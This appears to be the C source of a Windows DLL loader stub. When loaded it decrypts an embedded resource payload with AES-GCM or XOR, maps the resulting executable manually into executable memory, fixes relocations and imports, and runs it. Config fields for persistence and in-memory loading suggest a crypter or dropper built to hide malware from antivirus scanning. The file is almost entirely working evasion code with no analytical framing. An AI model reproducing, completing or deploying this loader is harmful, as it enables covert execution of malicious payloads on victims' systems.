#include <windows.h>
#include <stdio.h>
#include <stdint.h>
// OpenSSL for AES-GCM
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <openssl/err.h>

void hex_to_bytes(const char *hex, unsigned char *bytes, size_t len) {
    for (size_t i = 0; i < len; i++) {
        sscanf(hex + 2 * i, "%2hhx", &bytes[i]);
    }
}

int apply_relocations(unsigned char *imageBase, PIMAGE_NT_HEADERS ntHeader, DWORD64 delta, SIZE_T image_size) {
    if (ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size == 0) return 0;
    ULONG reloc_rva = ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
    if (reloc_rva == 0 || reloc_rva >= image_size) return -1;
    PIMAGE_BASE_RELOCATION relocation = (PIMAGE_BASE_RELOCATION)(imageBase + reloc_rva);
    SIZE_T processed = 0;
    SIZE_T dir_size = ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
    while (processed < dir_size && relocation->VirtualAddress) {
        if (relocation->SizeOfBlock < sizeof(IMAGE_BASE_RELOCATION)) return -1;
        DWORD numRelocs = (relocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
        WORD *relocData = (WORD *)(relocation + 1);
        for (DWORD i = 0; i < numRelocs; i++) {
            int type = relocData[i] >> 12;
            int offset = relocData[i] & 0xFFF;
            if (type == IMAGE_REL_BASED_DIR64) {
                SIZE_T addr_off = (SIZE_T)relocation->VirtualAddress + (SIZE_T)offset;
                if (addr_off + sizeof(DWORD64) > image_size) return -1;
                DWORD64 *address = (DWORD64 *)(imageBase + addr_off);
                *address += delta;
            }
        }
        processed += relocation->SizeOfBlock;
        relocation = (PIMAGE_BASE_RELOCATION)((BYTE *)relocation + relocation->SizeOfBlock);
    }
    return 0;
}

int resolve_imports(unsigned char *imageBase, PIMAGE_NT_HEADERS ntHeader, SIZE_T image_size) {
    if (ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size == 0) return 0;
    ULONG import_rva = ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
    if (import_rva == 0 || import_rva >= image_size) return -1;
    PIMAGE_IMPORT_DESCRIPTOR importDesc = (PIMAGE_IMPORT_DESCRIPTOR)(imageBase + import_rva);
    SIZE_T processed = 0;
    SIZE_T dir_size = ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size;
    while (processed < dir_size && importDesc->Name) {
        ULONG name_rva = importDesc->Name;
        if (name_rva == 0 || name_rva >= image_size) return -1;
        LPCSTR dllName = (LPCSTR)(imageBase + name_rva);
        HMODULE hDll = LoadLibraryA(dllName);
        if (!hDll) return -1;
        PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)(imageBase + importDesc->FirstThunk);
        while (thunk->u1.AddressOfData) {
            if ((SIZE_T)thunk < (SIZE_T)imageBase || (SIZE_T)thunk >= (SIZE_T)imageBase + image_size) return -1;
            if (thunk->u1.Ordinal & IMAGE_ORDINAL_FLAG) {
                thunk->u1.Function = (ULONGLONG)GetProcAddress(hDll, (LPCSTR)(thunk->u1.Ordinal & 0xFFFF));
            } else {
                ULONG import_by_name_rva = (ULONG)thunk->u1.AddressOfData;
                if (import_by_name_rva == 0 || import_by_name_rva >= image_size) return -1;
                PIMAGE_IMPORT_BY_NAME importByName = (PIMAGE_IMPORT_BY_NAME)(imageBase + import_by_name_rva);
                thunk->u1.Function = (ULONGLONG)GetProcAddress(hDll, importByName->Name);
            }
            if (!thunk->u1.Function) return -1;
            thunk++;
        }
        processed += sizeof(IMAGE_IMPORT_DESCRIPTOR);
        importDesc++;
    }
    return 0;
}

HMODULE g_hModule = NULL;

DWORD WINAPI ExecutePayloadThread(LPVOID lpParam) {
    HRSRC hRes = FindResource(g_hModule, "CONFIG", "PAYLOAD");
    if (!hRes) {
        return 1;
    }

    HGLOBAL hGlobal = LoadResource(g_hModule, hRes);
    if (!hGlobal) {
        return 1;
    }

    void *config_data = LockResource(hGlobal);
    if (!config_data) {
        return 1;
    }

    DWORD config_size = SizeofResource(g_hModule, hRes);
    if (config_size == 0) {
        return 1;
    }

    // Parse the PayloadConfig structure
    typedef struct {
        char key_hex[65];           // 64 chars + null terminator
        unsigned char persistence;  // 1 byte
        uint32_t junk_url_count;    // 4 bytes
        uint64_t payload_size;      // 8 bytes
        unsigned char load_in_memory; // 1 byte
        unsigned char payload_data[1]; // Variable length
    } PayloadConfig;
    PayloadConfig *config = (PayloadConfig *)config_data;
    char *key_hex = config->key_hex;
    uint64_t payload_size = config->payload_size; // plaintext size
    unsigned char *encrypted_payload = config->payload_data;

    // Determine stored length (resource size minus header)
    size_t stored_len = (size_t)config_size - offsetof(PayloadConfig, payload_data);

    unsigned char *decrypted_payload = malloc((size_t)payload_size);
    if (!decrypted_payload) return 1;

    // If stored data starts with AESG header, perform AES-GCM decryption
    if (stored_len >= 4 && memcmp(encrypted_payload, "AESG", 4) == 0) {
        size_t iv_len = 12; size_t tag_len = 16;
        if (stored_len < 4 + iv_len + tag_len) { free(decrypted_payload); return 1; }
        unsigned char *iv = encrypted_payload + 4;
        unsigned char *tag = encrypted_payload + 4 + iv_len;
        unsigned char *ciphertext = encrypted_payload + 4 + iv_len + tag_len;
        size_t ciphertext_len = stored_len - (4 + iv_len + tag_len);

        if (strlen(key_hex) != 64) { free(decrypted_payload); return 1; }
        unsigned char key[32];
        hex_to_bytes(key_hex, key, 32);

        EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
        if (!ctx) { free(decrypted_payload); return 1; }
        if (EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL) != 1) { EVP_CIPHER_CTX_free(ctx); free(decrypted_payload); return 1; }
        if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_AEAD_SET_IVLEN, (int)iv_len, NULL) != 1) { EVP_CIPHER_CTX_free(ctx); free(decrypted_payload); return 1; }
        if (EVP_DecryptInit_ex(ctx, NULL, NULL, key, iv) != 1) { EVP_CIPHER_CTX_free(ctx); free(decrypted_payload); return 1; }
        int outlen = 0;
        if (ciphertext_len > 0) {
            if (EVP_DecryptUpdate(ctx, decrypted_payload, &outlen, ciphertext, (int)ciphertext_len) != 1) { EVP_CIPHER_CTX_free(ctx); free(decrypted_payload); return 1; }
        }
        int plaintext_len = outlen;
        if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_AEAD_SET_TAG, (int)tag_len, (void *)tag) != 1) { EVP_CIPHER_CTX_free(ctx); free(decrypted_payload); return 1; }
        if (EVP_DecryptFinal_ex(ctx, decrypted_payload + outlen, &outlen) != 1) { EVP_CIPHER_CTX_free(ctx); free(decrypted_payload); return 1; }
        plaintext_len += outlen;
        EVP_CIPHER_CTX_free(ctx);
        if ((uint64_t)plaintext_len != payload_size) { free(decrypted_payload); return 1; }
    } else {
        // Legacy XOR
        if ((size_t)payload_size > stored_len) { free(decrypted_payload); return 1; }
        if (strlen(key_hex) != 64) { free(decrypted_payload); return 1; }
        unsigned char key[32]; hex_to_bytes(key_hex, key, 32);
        memcpy(decrypted_payload, encrypted_payload, (size_t)payload_size);
        for (uint64_t i = 0; i < payload_size; i++) decrypted_payload[i] ^= key[i % 32];
    }

    // Allocate memory for the EXE image
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)decrypted_payload;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) { free(decrypted_payload); return 1; }
    if (dosHeader->e_lfanew == 0 || (size_t)dosHeader->e_lfanew >= (size_t)payload_size) { free(decrypted_payload); return 1; }
    PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((BYTE *)decrypted_payload + dosHeader->e_lfanew);
    if (ntHeader->Signature != IMAGE_NT_SIGNATURE) { free(decrypted_payload); return 1; }
    SIZE_T image_size = ntHeader->OptionalHeader.SizeOfImage;
    if (image_size == 0 || image_size > (SIZE_T)payload_size * 10) { /* sanity cap */ free(decrypted_payload); return 1; }

    LPVOID imageBase = VirtualAlloc(NULL, image_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!imageBase) {
        free(decrypted_payload);
        return 1;
    }

    // Copy headers (validate)
    SIZE_T headers_size = ntHeader->OptionalHeader.SizeOfHeaders;
    if (headers_size == 0 || headers_size > payload_size) { VirtualFree(imageBase, 0, MEM_RELEASE); free(decrypted_payload); return 1; }
    memcpy(imageBase, decrypted_payload, headers_size);

    // Copy sections
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeader);
    for (DWORD i = 0; i < ntHeader->FileHeader.NumberOfSections; i++) {
        SIZE_T raw_size = section[i].SizeOfRawData;
        SIZE_T raw_ptr = section[i].PointerToRawData;
        SIZE_T virt_addr = section[i].VirtualAddress;
        if (raw_size == 0) continue;
        if (raw_ptr + raw_size > (SIZE_T)payload_size) { VirtualFree(imageBase, 0, MEM_RELEASE); free(decrypted_payload); return 1; }
        if (virt_addr + raw_size > image_size) { VirtualFree(imageBase, 0, MEM_RELEASE); free(decrypted_payload); return 1; }
        memcpy((BYTE *)imageBase + virt_addr, (BYTE *)decrypted_payload + raw_ptr, raw_size);
    }

    // Apply relocations
    DWORD64 delta = (DWORD64)imageBase - ntHeader->OptionalHeader.ImageBase;
    if (delta != 0) {
        if (apply_relocations((unsigned char *)imageBase, ntHeader, delta, image_size) != 0) {
            VirtualFree(imageBase, 0, MEM_RELEASE); free(decrypted_payload); return 1;
        }
    }

    // Resolve imports
    if (resolve_imports((unsigned char *)imageBase, ntHeader, image_size) != 0) {
        VirtualFree(imageBase, 0, MEM_RELEASE); free(decrypted_payload); return 1;
    }

    // Execute the payload
    typedef int (WINAPI *WinMain_t)(HINSTANCE, HINSTANCE, LPSTR, int);
    WinMain_t entryPoint = (WinMain_t)((DWORD64)imageBase + ntHeader->OptionalHeader.AddressOfEntryPoint);
    int result = entryPoint(NULL, NULL, NULL, 10); // SW_SHOW

    // Clean up
    VirtualFree(imageBase, 0, MEM_RELEASE);
    free(decrypted_payload);

    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH:
            g_hModule = hModule; // Store the module handle for resource loading
            CreateThread(NULL, 0, ExecutePayloadThread, NULL, 0, NULL);
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}